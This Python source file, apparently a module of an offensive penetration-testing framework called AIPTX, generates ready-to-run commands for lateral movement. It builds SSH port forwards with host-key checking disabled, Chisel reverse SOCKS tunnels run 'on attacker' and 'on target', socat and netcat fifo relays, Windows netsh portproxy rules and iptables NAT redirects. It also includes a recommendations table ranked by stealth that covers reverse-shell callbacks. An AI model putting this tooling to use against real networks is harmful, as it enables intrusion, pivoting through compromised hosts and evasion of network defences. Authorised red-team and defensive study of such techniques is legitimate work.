"""
AIPTX Beast Mode - Tunnel Creator
=================================

Create various types of tunnels for lateral movement.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class TunnelType(str, Enum):
    """Types of tunnels."""
    SSH_LOCAL = "ssh_local"      # -L: local -> remote
    SSH_REMOTE = "ssh_remote"    # -R: remote -> local
    SSH_DYNAMIC = "ssh_dynamic"  # -D: SOCKS proxy
    CHISEL_FORWARD = "chisel_forward"
    CHISEL_REVERSE = "chisel_reverse"
    SOCAT = "socat"
    NETSH = "netsh"  # Windows
    PLINK = "plink"  # Windows SSH


@dataclass
class TunnelConfig:
    """Configuration for a tunnel."""
    tunnel_type: TunnelType
    local_host: str = "127.0.0.1"
    local_port: int = 8080
    remote_host: str = ""
    remote_port: int = 0
    pivot_host: str = ""
    pivot_port: int = 22
    pivot_user: str = "root"
    key_file: str | None = None
    password: str | None = None
    options: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "tunnel_type": self.tunnel_type.value,
            "local_host": self.local_host,
            "local_port": self.local_port,
            "remote_host": self.remote_host,
            "remote_port": self.remote_port,
            "pivot_host": self.pivot_host,
            "pivot_port": self.pivot_port,
            "pivot_user": self.pivot_user,
            "options": self.options,
        }


class TunnelCreator:
    """
    Create network tunnels for lateral movement.

    Supports SSH tunnels, Chisel, socat, and Windows-specific tools.
    """

    def __init__(self):
        """Initialize tunnel creator."""
        self._tunnels: list[TunnelConfig] = []

    def create_ssh_local_forward(
        self,
        local_port: int,
        remote_host: str,
        remote_port: int,
        pivot_host: str,
        pivot_user: str = "root",
        pivot_port: int = 22,
        key_file: str | None = None,
    ) -> dict[str, str]:
        """
        Create SSH local port forward (-L).

        Forward local port to remote host through pivot.

        Args:
            local_port: Local port to listen on
            remote_host: Target host to forward to
            remote_port: Target port to forward to
            pivot_host: SSH pivot host
            pivot_user: SSH username
            pivot_port: SSH port
            key_file: Optional SSH key path

        Returns:
            Command configuration
        """
        cmd_parts = [
            "ssh",
            "-L", f"{local_port}:{remote_host}:{remote_port}",
            "-N", "-f",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-p", str(pivot_port),
        ]

        if key_file:
            cmd_parts.extend(["-i", key_file])

        cmd_parts.append(f"{pivot_user}@{pivot_host}")

        return {
            "command": " ".join(cmd_parts),
            "tunnel_type": "ssh_local",
            "description": f"Forward localhost:{local_port} -> {remote_host}:{remote_port} via {pivot_host}",
            "usage": f"Connect to 127.0.0.1:{local_port} to reach {remote_host}:{remote_port}",
        }

    def create_ssh_remote_forward(
        self,
        remote_port: int,
        local_host: str,
        local_port: int,
        pivot_host: str,
        pivot_user: str = "root",
        pivot_port: int = 22,
        key_file: str | None = None,
    ) -> dict[str, str]:
        """
        Create SSH remote port forward (-R).

        Forward remote port back to local host.

        Args:
            remote_port: Port on pivot to listen
            local_host: Local target host
            local_port: Local target port
            pivot_host: SSH pivot host
            pivot_user: SSH username
            pivot_port: SSH port
            key_file: Optional SSH key path

        Returns:
            Command configuration
        """
        cmd_parts = [
            "ssh",
            "-R", f"{remote_port}:{local_host}:{local_port}",
            "-N", "-f",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "GatewayPorts=yes",
            "-p", str(pivot_port),
        ]

        if key_file:
            cmd_parts.extend(["-i", key_file])

        cmd_parts.append(f"{pivot_user}@{pivot_host}")

        return {
            "command": " ".join(cmd_parts),
            "tunnel_type": "ssh_remote",
            "description": f"Forward {pivot_host}:{remote_port} -> {local_host}:{local_port}",
            "usage": f"From pivot network, connect to pivot:{remote_port}",
        }

    def create_chisel_tunnel(
        self,
        mode: str,  # "forward" or "reverse"
        server_host: str,
        server_port: int,
        local_port: int,
        remote_host: str = "",
        remote_port: int = 0,
    ) -> dict[str, Any]:
        """
        Create Chisel tunnel commands.

        Args:
            mode: "forward" or "reverse"
            server_host: Chisel server host
            server_port: Chisel server port
            local_port: Local port
            remote_host: Remote target (for forward mode)
            remote_port: Remote port (for forward mode)

        Returns:
            Server and client commands
        """
        if mode == "reverse":
            # Reverse SOCKS - client on target, server locally
            return {
                "server_command": f"chisel server --reverse --port {server_port}",
                "client_command": f"chisel client {server_host}:{server_port} R:socks",
                "tunnel_type": "chisel_reverse",
                "description": "Reverse SOCKS proxy through Chisel",
                "usage": f"Use proxy socks5://127.0.0.1:1080 after connection",
                "notes": "Run server on attacker, client on target",
            }
        else:
            # Forward tunnel
            return {
                "server_command": f"chisel server --port {server_port}",
                "client_command": f"chisel client {server_host}:{server_port} {local_port}:{remote_host}:{remote_port}",
                "tunnel_type": "chisel_forward",
                "description": f"Forward localhost:{local_port} -> {remote_host}:{remote_port}",
                "usage": f"Connect to 127.0.0.1:{local_port}",
            }

    def create_socat_relay(
        self,
        listen_port: int,
        target_host: str,
        target_port: int,
        listen_host: str = "0.0.0.0",
    ) -> dict[str, str]:
        """
        Create socat port relay.

        Args:
            listen_port: Port to listen on
            target_host: Target to forward to
            target_port: Target port
            listen_host: Interface to listen on

        Returns:
            Socat command configuration
        """
        return {
            "command": f"socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port}",
            "background_command": f"nohup socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port} &",
            "tunnel_type": "socat",
            "description": f"Relay {listen_host}:{listen_port} -> {target_host}:{target_port}",
            "notes": "Requires socat on pivot host",
        }

    def create_netcat_relay(
        self,
        listen_port: int,
        target_host: str,
        target_port: int,
    ) -> dict[str, str]:
        """
        Create netcat-based relay (fifo method).

        Args:
            listen_port: Port to listen on
            target_host: Target to forward to
            target_port: Target port

        Returns:
            Netcat relay commands
        """
        return {
            "setup_command": "mkfifo /tmp/backpipe",
            "relay_command": f"nc -lvp {listen_port} 0</tmp/backpipe | nc {target_host} {target_port} 1>/tmp/backpipe",
            "tunnel_type": "netcat",
            "description": f"NC relay to {target_host}:{target_port}",
            "notes": "Basic relay, single connection only",
        }

    def get_windows_tunnel_commands(
        self,
        local_port: int,
        remote_host: str,
        remote_port: int,
    ) -> list[dict[str, str]]:
        """
        Get Windows-specific tunnel commands.

        Args:
            local_port: Local listening port
            remote_host: Target host
            remote_port: Target port

        Returns:
            List of Windows tunnel commands
        """
        return [
            {
                "name": "netsh_portproxy",
                "command": f"netsh interface portproxy add v4tov4 listenport={local_port} listenaddress=0.0.0.0 connectport={remote_port} connectaddress={remote_host}",
                "cleanup": f"netsh interface portproxy delete v4tov4 listenport={local_port} listenaddress=0.0.0.0",
                "description": "Windows native port forwarding",
                "requires_admin": True,
            },
            {
                "name": "plink",
                "command": f"plink.exe -ssh -L {local_port}:{remote_host}:{remote_port} -N user@pivot_host",
                "description": "PuTTY Link SSH tunnel",
                "requires_admin": False,
            },
            {
                "name": "ssh_windows",
                "command": f"ssh -L {local_port}:{remote_host}:{remote_port} -N user@pivot_host",
                "description": "Windows OpenSSH tunnel",
                "requires_admin": False,
            },
        ]

    def get_iptables_redirect(
        self,
        listen_port: int,
        target_host: str,
        target_port: int,
        interface: str = "eth0",
    ) -> dict[str, str]:
        """
        Get iptables NAT redirect commands.

        Args:
            listen_port: Port to intercept
            target_host: Target to forward to
            target_port: Target port
            interface: Network interface

        Returns:
            Iptables command configuration
        """
        return {
            "enable_forwarding": "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "prerouting_rule": f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport {listen_port} -j DNAT --to-destination {target_host}:{target_port}",
            "postrouting_rule": f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE",
            "cleanup_prerouting": f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport {listen_port} -j DNAT --to-destination {target_host}:{target_port}",
            "cleanup_postrouting": f"iptables -t nat -D POSTROUTING -o {interface} -j MASQUERADE",
            "description": f"NAT redirect {listen_port} -> {target_host}:{target_port}",
            "requires_root": True,
        }

    def get_tunnel_recommendations(
        self,
        scenario: str,
    ) -> list[dict[str, Any]]:
        """
        Get tunnel recommendations for common scenarios.

        Args:
            scenario: Scenario type

        Returns:
            List of recommended tunnel configurations
        """
        scenarios = {
            "reach_internal_web": [
                {
                    "method": "SSH Local Forward",
                    "command_type": "ssh_local",
                    "priority": 1,
                    "stealth": "high",
                    "notes": "Best for single service access",
                },
                {
                    "method": "Chisel Forward",
                    "command_type": "chisel_forward",
                    "priority": 2,
                    "stealth": "medium",
                    "notes": "Good when SSH not available",
                },
            ],
            "full_network_access": [
                {
                    "method": "SSH Dynamic (SOCKS5)",
                    "command_type": "ssh_dynamic",
                    "priority": 1,
                    "stealth": "high",
                    "notes": "Use with proxychains for full network access",
                },
                {
                    "method": "Chisel Reverse SOCKS",
                    "command_type": "chisel_reverse",
                    "priority": 2,
                    "stealth": "medium",
                    "notes": "Works through restrictive firewalls",
                },
            ],
            "reverse_shell_callback": [
                {
                    "method": "SSH Remote Forward",
                    "command_type": "ssh_remote",
                    "priority": 1,
                    "stealth": "high",
                    "notes": "Expose local listener to pivot network",
                },
                {
                    "method": "Chisel Reverse",
                    "command_type": "chisel_reverse",
                    "priority": 2,
                    "stealth": "medium",
                    "notes": "HTTP-based, good for egress filtering",
                },
            ],
            "windows_environment": [
                {
                    "method": "netsh portproxy",
                    "command_type": "netsh",
                    "priority": 1,
                    "stealth": "high",
                    "notes": "Native Windows, no tools needed",
                },
                {
                    "method": "Chisel Windows Client",
                    "command_type": "chisel_forward",
                    "priority": 2,
                    "stealth": "medium",
                    "notes": "Single binary, works well on Windows",
                },
            ],
        }

        return scenarios.get(scenario, [])


def create_tunnel(
    tunnel_type: str,
    **kwargs,
) -> dict[str, Any]:
    """Convenience function to create a tunnel."""
    creator = TunnelCreator()

    if tunnel_type == "ssh_local":
        return creator.create_ssh_local_forward(**kwargs)
    elif tunnel_type == "ssh_remote":
        return creator.create_ssh_remote_forward(**kwargs)
    elif tunnel_type in ("chisel_forward", "chisel_reverse"):
        return creator.create_chisel_tunnel(
            mode="forward" if tunnel_type == "chisel_forward" else "reverse",
            **kwargs,
        )
    elif tunnel_type == "socat":
        return creator.create_socat_relay(**kwargs)

    return {"error": f"Unknown tunnel type: {tunnel_type}"}


__all__ = [
    "TunnelType",
    "TunnelConfig",
    "TunnelCreator",
    "create_tunnel",
]
